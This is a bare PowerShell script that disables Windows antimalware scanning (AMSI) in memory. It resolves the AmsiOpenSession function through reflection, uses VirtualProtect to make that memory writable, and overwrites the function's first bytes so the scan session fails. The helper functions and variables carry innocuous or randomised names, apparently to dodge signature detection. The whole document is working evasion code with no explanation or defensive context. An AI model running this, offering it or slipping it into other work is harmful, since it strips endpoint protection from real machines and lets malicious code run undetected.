function candidate {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');
 $tmp=@();
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 try{
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName));
 }
 catch{
        $tmpPtr = New-Object IntPtr
 	$modHandle = $assem.GetMethod('GetModuleHandle').Invoke($null,@($moduleName))
 	$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $modHandle)
 	return $tmp[0].Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $functionName))
 }
}

function fleck {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $MiFTRNds99 = [Void]
 )
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed');
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $MiFTRNds99, $func).SetImplementationFlags('Runtime, Managed');
 return $type.CreateType();
}

[IntPtr]$LGaudzvo99 = candidate amsi.dll AmsiOpenSession;
$HjmYfFIP99 = 0;
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((candidate kernel32.dll VirtualProtect),(fleck @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));
$vp.Invoke($LGaudzvo99, 3, 0x40, [ref]$HjmYfFIP99);
$buf = [Byte[]] (0x48, 0x31, 0xC0); 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $LGaudzvo99, 3);
$vp.Invoke($LGaudzvo99, 3, 0x20, [ref]$HjmYfFIP99);

